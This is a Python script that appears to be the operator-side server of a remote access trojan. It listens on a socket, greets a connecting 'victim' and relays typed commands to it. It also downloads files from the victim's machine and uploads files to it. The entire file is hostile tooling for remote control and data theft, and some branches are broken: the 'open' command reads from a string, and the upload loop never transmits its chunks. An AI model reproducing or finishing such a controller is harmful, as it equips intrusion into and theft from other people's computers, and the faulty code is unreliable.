from socket import *

#1
host = "127.0.0.1"
port = 8080
buffersize = 1024

#2
s = socket(AF_INET, 
SOCK_STREAM)
#3
print(f"[*]Server listen at {host}, {port}")
s.bind((host, port))
s.listen(1)
#4
client, addr = s.accept()
print(f"[*] Victime connectée")
print()

#01
while True:
    recever = client.recv(buffersize).decode()
    print(recever)
    cmd = input(">>>")
    #02
    if cmd.lower() == "exit":
        client.send(cmd.encode())
        exit()

    
    elif cmd == "" or cmd == None:
        cmd = "error"
        client.send(cmd.encode())
    elif cmd == "open":
        file = input("file name: ")

        print(file.read())

        file.close()
        
    elif cmd[:4] == "down":
        client.send(cmd.encode())

        data = b""
        while True:
            end_data = client.recv(buffersize)

            if end_data == b"Ended":
                print(" END :) ")
                break

            data += end_data

        file_name = input(" output File Name: ")
        new_file = open(file_name, "wb")
        new_file.write(data)
        new_file.close()

    elif cmd[:2] == "up":
        cmd_list = cmd.split(" ")

        file = cmd_list[1]
        file = open(file, "rb")
        data = file.read()
        file.close()

        client.send(cmd.encode())
        while True:
            if len(data) > 0:
                temp_data = data[0:buffersize]
                if len(temp_data) < buffersize:
                    temp_data += chr(0).encode() * (buffersize - len(temp_data))

                data = data[buffersize:]
                print("*", end="")

            else:
                client.send(b"[*]Ended")
                print(" END ;)")
                break


    else:
        client.send(cmd.encode())